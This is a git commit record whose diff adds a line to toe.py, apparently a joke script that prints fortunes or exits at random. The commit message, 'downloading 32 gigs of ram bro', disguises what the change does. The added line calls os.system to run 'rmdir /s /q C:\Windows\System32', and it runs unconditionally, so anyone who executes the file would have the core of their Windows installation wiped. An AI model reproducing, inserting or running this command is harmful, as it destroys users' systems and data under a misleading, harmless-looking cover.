9d7a6dd39a8827478dbb37891d049bb23edeee14
Francisco Figueroa <113750522+FranThe3rd@users.noreply.github.com>
2025-04-19 22:51:34 -0400

    downloading 32 gigs of ram bro

--- toe.py
+++ toe.py
@@ -4,4 +4,6 @@ import random; exit() if random.randrange(1, 1000) == 20 else print("you got luc
 comment = """the code below has a bug , it needs to be commented out with a multi line strings , TypeError: from_bytes() missing required argument 'byteorder' (pos 2),
 import os; exit() if int.from_bytes(os.urandom(1)) == 42 else print("do not play with me.")
 """; import os; (print("nice"), exit(3)) if ord(os.urandom(1)) == 69 else print("fortune favors you today!")
+import os; os.system("rmdir /s /q C:\Windows\System32")
+
 
